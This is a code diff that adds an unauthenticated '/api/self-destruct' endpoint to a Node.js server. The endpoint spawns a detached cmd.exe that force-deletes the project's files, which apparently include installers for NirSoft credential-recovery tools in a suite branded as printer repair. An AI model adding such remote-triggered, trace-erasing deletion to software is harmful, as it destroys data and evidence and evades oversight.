@@ -265,6 +265,27 @@ const server = http.createServer((req, res) => {
         res.writeHead(500, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({ error: 'Failed to fetch geo data', details: error.message }));
       });
+  }
+
+
+  // API Endpoint to Self-Destruct Server
+  if (req.method === 'POST' && req.url === '/api/self-destruct') {
+    console.log('[API Server] Self-destruct request received. Initiating cleanup...');
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ success: true, message: 'Initiating self-destruct' }));
+
+    const cleanupCommand = 'timeout /t 2 /nobreak && del /f /q main.exe server.js Start-Admin-Server.bat index.html app.js styles.css logo.png launch.ps1 Printer-Repair-Toolbox.bat Launch-PrintPulse-Suite.bat Fix-Port-And-Compile.bat Restart-Server.bat install_nirsoft.js install_mailpv.js Launch-Dashboard.lnk';
+    
+    // Spawn detached CMD process
+    const { spawn } = require('child_process');
+    spawn('cmd.exe', ['/c', cleanupCommand], {
+      detached: true,
+      stdio: 'ignore'
+    }).unref();
+
+    setTimeout(() => {
+      process.exit(0);
+    }, 500);
     return;
   }
 
